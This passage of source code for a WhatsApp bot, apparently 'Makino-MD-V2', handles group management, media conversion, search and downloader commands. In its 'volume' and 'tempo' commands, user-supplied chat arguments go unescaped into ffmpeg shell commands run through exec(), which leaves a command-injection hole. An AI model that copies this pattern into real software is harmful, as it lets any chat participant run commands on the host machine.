              sendOrder(m.chat, teks, "667140254502463", fs.readFileSync('./Assets/pic7.jpg'), `${global.packname}`, `${global.BotName}`, "916297175943@s.whatsapp.net", "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==", "99999999999999999999")
            } else if (sizny > 20) {
              await Taira.groupAcceptInvite(vcc).then(async (res) => reply(jsonformat(res))).catch(_ => _)
              reply("Joined !")
            } else {
              reply("Error")
            }
          }).catch(_ => _)
        }
      }
        break;


      case 'bye': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isCreator) return reply(mess.botowner);
	await Taira.groupLeave(m.chat)
	}
        break 


      case 'left': case 'leavegc': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isAdmins && !isCreator) return reply(mess.useradmin);

        let msg = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: null
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: '            Powered by Taira Makino'
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: 'https://r4.wallpaperflare.com/wallpaper/1003/376/845/makoto-shinkai-kimi-no-na-wa-wallpaper-0816ade8b0301c58302c014e48d2441a.jpg' } }, { upload: Taira.waUploadToServer })),

                  title: '        Leave Group Confirmation',
                  subtitle: null,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "quick_reply",
                      "buttonParamsJson": `{"display_text":"Yes,leave","id":"${prefix}bye"}`
                    },
                    {
                      "name": "quick_reply",
                      "buttonParamsJson": `{"display_text":"No","id":"ok"}`
                    }
                  ],
                })
              })
            }
          }
        }, {});

        await Taira.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        }).catch(err => {
          console.error('Error relaying message:', err);
          return reply('Error relaying message.');
        });

        break;
      }

      //
      case 'groupevent':
      case 'group-event':

        Taira.sendMessage(from, { react: { text: '❤', key: m.key } });
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)

        if (args.length === 0) {
          if (global.groupevent) {
            return m.reply(`Group events are currently *enabled*.\n\nYou can turn them *off* using "${global.prefa[0]}groupevent off".`);
          } else {
            return m.reply(`Group events are currently *disabled*.\n\nYou can turn them *on* using "${global.prefa[0]}groupevent on".`);
          }
        } else if (args.length === 1 && (args[0] === 'on' || args[0] === 'off')) {
          const status = args[0];
          if (status === 'on') {
            if (global.groupevent) {
              return m.reply(`Group events are already *enabled*.`);
            } else {
              global.groupevent = true;
              return m.reply(`Group events are now *enabled*.`);
            }
          } else {
            if (!global.groupevent) {
              return m.reply(`Group events are already *disabled*.`);
            } else {
              global.groupevent = false;
              return m.reply(`Group events are now *disabled*.`);
            }
          }
        } else {
          return m.reply(`Usage: ${global.prefa[0]}groupevent [on/off]`);
        }
        break;


      //
      case 'ban': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        if (!args[0]) return reply(`Select add or del (add to ban, del to unban), For Example: reply *${prefix}ban add* to the user you want to ban.`)
        if (args[1]) {
          orgnye = args[1] + "@s.whatsapp.net"
        } else if (m.quoted) {
          orgnye = m.quoted.sender
        }
        const isBane = banUser.includes(orgnye)
        if (args[0] === "add") {
          if (isBane) return ads('User was already banned.')
          banUser.push(orgnye)
          reply(`Successfully banned the user`)
        } else if (args[0] === "del") {
          if (!isBane) return ads('User was already unbanned.')
          let delbans = banUser.indexOf(orgnye)
          banUser.splice(delbans, 1)
          reply(`Successfully unbanned the user.`)
        } else {
          reply("Error")
        }
      }
        break;


      case 'antilink': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkAll) return reply('Already activated')
          ntilinkall.push(from)
          reply('Enabled all antilink !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkAll) return reply('Already deactivated')
          let off = ntilinkall.indexOf(from)
          ntilinkall.splice(off, 1)
          reply('Disabled all antilink !')
        } else {
          let textmsg = 'Type ' + `${prefix}${command}` + ' on to turn on antilink feature or Type ' + `${prefix + command}` + ' off to turn off antilink feature'
          await Taira.sendMessage(m.chat, { text: `${textmsg}` }, `${global.BotName}`, m)
        }
      }
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//



      //
      case 'ringtone': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!args.join(" ")) return reply(`Example: ${prefix}ringtone black over`)
        let { ringtone } = require('./lib/scraper')
        let anu = await ringtone(text)
        let result = anu[Math.floor(Math.random() * anu.length)]
        Taira.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
      }
        break;


      case 'volume': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
        media = await Taira.downloadAndSaveMediaMessage(quoted, "volume")
        if (isQuotedAudio) {
          rname = getRandom('.mp3')
          exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            jadie = fs.readFileSync(rname)
            Taira.sendMessage(from, { audio: jadie, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            fs.unlinkSync(rname)
          })
        } else if (isQuotedVideo) {
          rname = getRandom('.mp4')
          exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            jadie = fs.readFileSync(rname)
            Taira.sendMessage(from, { video: jadie, mimetype: 'video/mp4' }, { quoted: m })
            fs.unlinkSync(rname)
          })
        } else {
          reply("Please send video/audio file only!")
        }
      }
        break;


      case 'tempo': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
        var req = args.join(' ')
        media = await Taira.downloadAndSaveMediaMessage(quoted, "tempo")
        if (isQuotedAudio) {
          ran = getRandom('.mp3')
          exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            hah = fs.readFileSync(ran)
            Taira.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            fs.unlinkSync(ran)
          })
        } else if (isQuotedVideo) {
          ran = getRandom('.mp4')
          exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            hah = fs.readFileSync(ran)
            Taira.sendMessage(from, { video: hah, mimetype: 'video/mp4' }, { quoted: m })
            fs.unlinkSync(ran)
          })
        } else {
          reply("Please send video/audio file only!")
        }
      }
        break;


      case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })

        try {
          let set
          if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
          if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
          if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
          if (/earrape/.test(command)) set = '-af volume=12'
          if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
          if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
          if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
          if (/reverse/.test(command)) set = '-filter_complex "areverse"'
          if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
          if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
          if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
          if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
          if (/audio/.test(mime)) {
            reply(mess.waiting)
            let media = await Taira.downloadAndSaveMediaMessage(quoted)
            let ran = getRandom('.mp3')
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
              fs.unlinkSync(media)
              if (err) return reply(err)
              let buff = fs.readFileSync(ran)
              Taira.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m })
              fs.unlinkSync(ran)
            })
          } else reply(`Pls mention any audio you want to modify _${prefix + command}_`)
        } catch (e) {
          reply(e)
        }
        break;


      case 'calculator': case 'cal': case 'calculate': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (args.length < 1) return reply(`*Example :*\n${prefix}calculator 2*5\n\n`)
        let qsd = args.join(" ")
        if (typeof mathjs.evaluate(qsd) !== 'number') {
          reply('Error')
        } else {
          reply(`\`\`\`「 _Calculator Tool_ 」\`\`\`\n\n*Input :* ${qsd}\n*Calculation Result :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
        }
      }
        break;



      //---------------------------------------------------------------------------------------------------------------------------------------//



      //
      case 'toimage': case 'makeimg': case 'toimg': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🪄", key: m.key } })
        if (!m.quoted) return reply('reply Image')
        if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
        reply(mess.waiting)
        let media = await Taira.downloadAndSaveMediaMessage(quoted)
        let ran = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) throw err
          let buffer = fs.readFileSync(ran)
          Taira.sendMessage(m.chat, { image: buffer }, { quoted: m })
          fs.unlinkSync(ran)
        })
      }
        break;


      case 'tomp4': case 'makemp4': case 'makevideo': case 'tovideo': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🪄", key: m.key } })
        if (!m.quoted) return reply('reply Image')
        if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
        reply(mess.waiting)
        let { webp2mp4File } = require('./lib/uploader')
        let media = await Taira.downloadAndSaveMediaMessage(quoted)
        let webpToMp4 = await webp2mp4File(media)
        await Taira.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Here it is...' } }, { quoted: m })
        await fs.unlinkSync(media)
      }
        break;


      case 'toaud': case 'audio': case 'toaudio': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })

        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
        if (!m.quoted) return reply(`Send/reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
        reply(mess.waiting)
        let media = await quoted.download()
        let { toAudio } = require('./lib/converter')
        let audio = await toAudio(media, 'mp4')
        Taira.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg' }, { quoted: m })
      }
        break;


      case 'tomp3': case 'mp3': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (/document/.test(mime)) return reply(`Send/reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
        if (!m.quoted) return reply(`Send/reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
        reply(mess.waiting)
        let media = await quoted.download()
        let { toAudio } = require('./lib/converter')
        let audio = await toAudio(media, 'mp4')
        Taira.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${global.BotName} (${m.id}).mp3` }, { quoted: m })
      }
        break;


      case 'togif': case 'makegif': case 'getgif': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!m.quoted) return reply('reply Image')
        if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
        reply(mess.wait)
        let { webp2mp4File } = require('./lib/uploader')
        let media = await Taira.downloadAndSaveMediaMessage(quoted)
        let webpToMp4 = await webp2mp4File(media)
        await Taira.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
        await fs.unlinkSync(media)
      }
        break;

      case "tourl": case 'url':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);

        let { GraphOrg } = require("./lib/uploader");
        if (!m.quoted) {
          //
          Taira.sendMessage(from, { react: { text: "❔", key: m.key } })
          return m.reply(
            `With caption not working, first send an *Image* / *Video* to generate a link! then tag with *${prefix}tourl*`
          );
        }
        let media5 = await Taira.downloadAndSaveMediaMessage(quoted);
        if (/image/.test(mime)) {
          //
          let anu = await GraphOrg(media5);
          m.reply(`*Image URL:* \n\n${util.format(anu)}\n`);
        } else if (/video/.test(mime)) {
          //
          try {
            let anu = await GraphOrg(media5);
            m.reply(`*Video URL:* \n\n${util.format(anu)}\n`);
          } catch (e) {
            //
            await fs.unlinkSync(media5);
            return Taira.sendMessage(
              m.from,
              {
                text: `*video size is too big!*\n\n*Max video size:* 5MB`,
              },
              { quoted: m }
            );
          }
        } else {
          //
          return m.reply(
            `Quote an *Image* / *Video* to generate a link!`
          );
        }
        await fs.unlinkSync(media5);
        break;



      //-------------------------------------------------------------------------------------------------------------------------------------//



    /*  case 'translate': case 'trt': case 'trans': {
        if (isBan) return reply(mess.banned);
        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })

        if (!args.join(" ")) return reply("Pls enter any text to translate")
        tes = await fetchJson(`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
        Infoo = tes.info
        Detek = tes.translate
        reply(`Input : ${Detek}\nTranslation Results : ${Infoo}`)
      }
        break;*/

      case 'gimage':
      case 'gig':
      case 'image': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } });

        if (!args[0]) return reply("Enter a search term to get Google Image!");
        let gis = require('g-i-s');
        gis(args.join(" "), async (error, result) => {
          if (error) {
            console.error(error);
            return reply("Error occurred while searching for images.");
          }

          if (!result || result.length === 0) {
            return reply("No images found for the given search term.");
          }

          n = result;
          images = n[Math.floor(Math.random() * n.length)].url;
          let buttonMessage = {
            image: { url: images },
            caption: `「 _Google Image Search_ 」\n\n_Search Term_ : ${text}\n_Media Url_ : ${images}`,
            footer: `${global.BotName}`,
            headerType: 4,
          };
          Taira.sendMessage(m.chat, buttonMessage, { quoted: m });
        });
      }
        break;


      //-------------------------------------------------------------------------------------------------------------------------------------//

      case 'google': case 'search': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "✨", key: m.key } })

        if (!args[0]) return reply(`Example: ${prefix + command} <query>\nUses : ${prefix + command} anything...`)
        let google = require('google-it')
        google({ 'query': args.join(" ") }).then(res => {
          let teks = `「 *🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ* 」\n\n*Search term:* ${text}\n\n\n`
          for (let g of res) {
            teks += `*Title* : ${g.title}\n\n`
            teks += `*Description* : ${g.snippet}\n\n`
            teks += `*Link* : ${g.link}\n\n\n        -----------------------------------------------------------------------------\n\n`
          }
          reply(teks)
        })
      }
        break;


      case "tts": case "texttospeech": case "say": case "speak": {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })

        if (!args[0]) return reply("Please give me a text so that i can speak it!")

        let texttosay = text
          ? text
          : m.quoted && m.quoted.text
            ? m.quoted.text
            : m.text;
        const SpeakEngine = require("google-tts-api");
        const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, { lang: "en", slow: false, host: "https://translate.google.com", });
        Taira.sendMessage(m.chat, { audio: { url: texttospeechurl, }, mimetype: "audio/mpeg", fileName: `TairaSpeechEngine.mp3`, }, { quoted: m, });
      }
        break;


      case 'wiki':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })

        if (args.length < 1) return reply('What Are You Looking For?? ')
        const res2 = await wikiSearch(q).catch(e => {
          return reply('Error Result Not Found!')
        })
        const result2 = `*Title :* ${res2[0].judul}\n*Wiki :* ${res2[0].wiki}`
        Taira.sendMessage(from, { image: { url: res2[0].thumb }, caption: result2 })
        break;


      case 'dict': {
        Taira.sendMessage(from, { react: { text: "📖", key: m.key } })
        // Extract the word from the message
        const word = text.trim();

        if (!word) {
          reply(`Please provide a word to look up on Urban Dictionary. Example: ${prefix}urban hello`);
          return;
        }

        // Make a request to the Urban Dictionary API
        const apiUrl = `https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(word)}`;

        try {
          const response = await axios.get(apiUrl);

          // Extract the first definition from the API response
          const definition = response.data.list[0]?.definition;

          if (definition) {
            const urbanMessage = `📖 *Urban Dictionary Definition for "${word}":*\n\n${definition}`;
            reply(urbanMessage);
          } else {
            reply(`No Urban Dictionary definition found for "${word}".`);
          }
        } catch (error) {
          console.error('Error fetching Urban Dictionary definition:', error.message);
          reply('An error occurred while fetching the Urban Dictionary definition. Please try again later.');
        }
      }
        break;


      case 'aju': case 'campus': case 'imgaju':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "✨", key: m.key } })

        const aju = {
          image: { url: 'https://campus-pictures.onrender.com/' },
          caption: `${pushname} here you go...`,

        }

        await Taira.sendMessage(m.chat, aju, { quoted: m }).catch(err => {
          return ('Error!')
        })

        break;


      //-----------------------------------------------------------------------------------------------------------------------------------//


      //
      case 'igdl':
      case 'instagram':
      case 'insta':
      case 'igreels': {
          if (isBan) {
            return reply(mess.banned);
          }
          if (isBanChat) {
            return reply(mess.bangc);
          }
          // Send a reaction emoji
          Taira.sendMessage(from, { react: { text: "🪄", key: m.key } });
 if (!text) return reply(`Please provide an Instagram video url!`)
var anu = await fetchJson(`https://widipe.com/download/igdl?url=${q}`)
var hassdl = anu.result[0].url
await Taira.sendMessage(m.chat, {
video: {
url: hassdl,
caption: '♱MAKINO-MD-V2♱♡⃤'
}
}, {
quoted: m
})
}
break;

     case "apk":
      case "apkdl":
        {
          if (!text) return reply("What apk do you wanna download?");
        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
         await Taira.sendMessage(
              m.chat,
              {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
        externalAdReply: {
          title: `♱MAKINO-MD-V2♱♡⃤`,
          body: `${tylor.BK9.name}`,
          thumbnailUrl: `${tylor.BK9.icon}`,
          sourceUrl: `${tylor.BK9.dllink}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
          }
      break;



      case 'mp4': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!args[0]) return reply(`Pls provide link!`)
        try {
          Taira.sendMessage(from, {
            video: { url: args[0] }, caption: "Succes!", contextInfo: {
              externalAdreply: {
                title: `♱MAKINO-MD-V2♱♡⃤`,
                body: `${global.OwnerName}`,
                thumbnail: BotLogo,
                mediaType: 2,
                mediaUrl: `https://chat.whatsapp.com/DOVRqF006VHHZhiSNwJRce`,
                sourceUrl: `https://chat.whatsapp.com/DOVRqF006VHHZhiSNwJRce`
              }
            }
          }, { quoted: m })
        } catch {
          reply("Link error!")
        }
      }
        break;


      case 'jpeg': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!args[0]) return reply(`Please provide link!`)
        try {
          Taira.sendMessage(from, { image: { url: args[0] }, caption: "Success!" }, { quoted: m })
        } catch {
          reply("Link error")
        }
      }
        break;

         case 'twitter': case 'ttdl': {
  if (!q) return reply("Provide a Twitter url to continue.")
   if (isBan) return reply(mess.banned);
  if (isBanChat) return reply(mess.bangc);
  if (!text) return reply(`Please provide the link!\n\nExample: ${prefix}${command} https://x.com/InternetH0F/status/1826967781629182205`)
let ty = await fetchJson(`https://widipe.com/download/twtdl?url=${encodeURIComponent(q)}`)
await Taira.sendMessage(m.chat, {
video: {
url: ty.result.url.hd,
caption: '♱MAKINO-MD-V2♱♡⃤'
}
}, {
quoted: m
})
}
break;


      case 'fbdl': case 'fb': case 'facebook': case 'fbmp4': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!text) return reply(`Please provide the link!\n\nExample: ${prefix}facebook https://www.facebook.com/groups/599913174599515/permalink/705467384044093/`)
let tyf = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(q)}`)
await Taira.sendMessage(m.chat, {
video: {
url: tyf.result.Normal_video,
caption: '♱MAKINO-MD-V2♱♡⃤'
}
}, {
quoted: m
})
}
break;


      case 'yts': case 'ytsearch': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "📍", key: m.key } })

        if (!args.join(" ")) return reply(`Example : -yts Heat waves`)
        let yts = require("youtube-yts")
        let search = await yts(args.join(" "))
        let teks = '```「 ♱MAKINO-MD-V2♱♡⃤ YTS 」```\n\n Search Term: ' + text + '\n\n'
        let no = 1
        for (let i of search.all) {
          teks += `Result No : ${no++}\n\nTitle : ${i.title}\n\nViews : ${i.views}\n\nDuration : ${i.timestamp}\n\nUploaded : ${i.ago}\n\nAuthor : ${i.author.name}\n\nUrl : ${i.url}\n\n\n-----------------------------------------------------------------------------\n\n\n`
        }
        Taira.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: teks }, { quoted: m })
      }
        break;


case 'tiktok': 
case 'tt': 
case 'ttdl': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!q) return reply("Provide a tiktok video link")
    Taira.sendMessage(from, { react: { text: "🍃", key: m.key } });
    let apiUrl = `https://widipe.com/download/tiktokdl?url=${encodeURIComponent(q)}`;
    const fetch = require('node-fetch');
    let response = await fetch(apiUrl);
    let jsonResponse = await response.json();
    let videoUrl = jsonResponse.result.video;
    Taira.sendMessage(from, { 
        video: { url: videoUrl }, 
        mimetype: "video/mp4", 
        caption: '> *♱MAKINO-MD-V2♱♡⃤*' 
    }, { quoted: m });
    break;
}

		    
case 'video': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
    if (!q) return reply("Provide a query")
    Taira.sendMessage(from, { react: { text: "🍃", key: m.key } });
    let yts = require("youtube-yts");
    let search = await yts(text);
    let anu = search.videos[0]; 
    let apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(anu.url)}`;
    const fetch = require('node-fetch'); 
    let response = await fetch(apiUrl);
    let jsonResponse = await response.json();
    let videoUrl = jsonResponse.result.mp4;
    let videoTitle = jsonResponse.result.title;
    Taira.sendMessage(from, { 
        video: { url: videoUrl }, 
        mimetype: "video/mp4", 
        caption: videoTitle + `\n> *♱MAKINO-MD-V2♱♡⃤*`
    }, { quoted: m });
    
    break;
}

case 'ytmp3':
{
      if (isBan) return reply(mess.banned);
      if (isBanChat) return reply(mess.bangc);
	if (!text) return reply('Please provide a valid  YouTube link!');
	let urls = text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return reply('Seems like your message does not contain a valid YouTube link');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length)
		return reply('Invalid URL index');
	await TylorXMp3(urls);
}
break;

case 'ytdl': case 'ytmp4': {
      if (isBan) return reply(mess.banned);
      if (isBanChat) return reply(mess.bangc);
    Taira.sendMessage(from, { react: { text: "🍃", key: m.key } });
    let apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(q)}`;
    const fetch = require('node-fetch'); 
    let response = await fetch(apiUrl);
    let jsonResponse = await response.json();
    let videoUrl = jsonResponse.result.mp4;
    let videoTitle = jsonResponse.result.title;
    Taira.sendMessage(from, { 
        video: { url: videoUrl }, 
        mimetype: "video/mp4", 
        caption: videoTitle + `\n> *♱MAKINO-MD-V2♱♡⃤*`
    }, { quoted: m });
    
    break;
    }

	
   case 'play': case 'song': {
      if (isBan) return reply(mess.banned);
      if (isBanChat) return reply(mess.bangc);
    if (!text) return reply(`Example : ${prefix + command} Halsey Without me`);
    const yts = require("youtube-yts");
    let search = await yts(text);
    let anup3k = search.videos[0];
    if (!anup3k) return reply("Song not found,,try another .....!");
    const apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(anup3k.url)}`;
    let audioResponse;
    try {
        audioResponse = await axios.get(apiUrl);
    } catch (error) {
        console.error("Error fetching audio:", error);
        return reply("Failed to download the audio. Please try again.");
    }
    if (!audioResponse.data.status) {
        return reply("Failed to retrieve audio URL. Please try again.");
    }
    const mp3Url = audioResponse.data.result.mp3;
    // Download the MP3 file
    let mp3Buffer;
    try {
        const mp3DownloadResponse = await axios.get(mp3Url, { responseType: 'arraybuffer' });
        mp3Buffer = Buffer.from(mp3DownloadResponse.data);
    } catch (error) {
        console.error("Error downloading MP3:", error);
        return reply("Failed to download the MP3. Please try again.");
    }
    await Taira.sendMessage(m.chat, {
        audio: mp3Buffer,
        fileName: anup3k.title + '.mp3',
        mimetype: 'audio/mp4',
        ptt: true,
        contextInfo: {
            externalAdReply: {
                title: anup3k.title,
                body: "♱MAKINO-MD-V2♱♡⃤",
                thumbnail: await fetchBuffer(anup3k.thumbnail), // Use thumbnail from the search result
                mediaType: 2,
                mediaUrl: anup3k.url,
            }
        },
    }, { quoted: m });
}
break
      //-----------------------------------------------------------------------------------------------------------------------------------//


      case 'spotify': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🍁", key: m.key } });

        if (!q) return reply(`Please provide a query. Example: ${prefix + command} 295`);

        let abuffer = `https://www.guruapi.tech/api/spotifydl?url=${encodeURIComponent(q)}`
        let bbuffer = await fetchJson(`https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(q)}`)

        let bimg = bbuffer.spty.results.thumbnail
        let bname = bbuffer.spty.results.title
        let burl = bbuffer.spty.results.url;

        await Taira.sendMessage(from, {
          audio: { url: abuffer },
          ptt: true,
          filename: 'error.mp3',
          mimetype: 'audio/mpeg',
          contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
              title: "↺ |◁   II   ▷|   ♡",
              body: `playing: ${bname}`,
              thumbnailUrl: bimg,
              sourceUrl: burl,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, { quoted: m }
        );
      }
        break;

        case 'lyrics':
        {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🍁", key: m.key } });
          if (!text)
            return reply(
              `What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`
            );
          let lyric = await fetch(
            `https://widipe.com/lirik?text=${text}`
          );
          let jsonxeon = await lyric.json();
          if (jsonxeon.result.error) {
            reply("Lyrics not found.");
          } else {
            reply(
              `
*♱MAKINO-MD-V2♱♡⃤*
*Artist*: ${jsonxeon.result.artist}\n\n*Lyrics*:\n${jsonxeon.result.lyrics}`
            );
          }
        }
        break;


	case 'runtime': case 'uptime': {
                let pinga = `Faster Than Your Girlfriend 💦`
                Taira.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `Uptime/Runtime ${runtime(process.uptime())}`,
                            body: `ταιяα мακιиο`,
                            thumbnailUrl: 'https://telegra.ph/file/5b7e44e2f5660aa2c4cad.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r',
                            mediaType: 1,
